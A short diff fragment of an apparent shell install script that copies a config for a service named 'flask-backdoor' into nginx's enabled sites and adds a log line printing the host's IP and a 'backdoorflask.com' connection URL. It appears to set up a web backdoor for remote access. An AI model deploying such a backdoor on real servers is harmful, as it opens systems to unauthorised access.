@@ -6,3 +6,5 @@ if [ $? -ne 0 ]; then
 fi
 
 cp /etc/flask-backdoor/setup/flaskbd /etc/nginx/sites-enabled/flaskbd
+setline
+infolog "Connect with: $(hostname -I) http://backdoorflask.com"
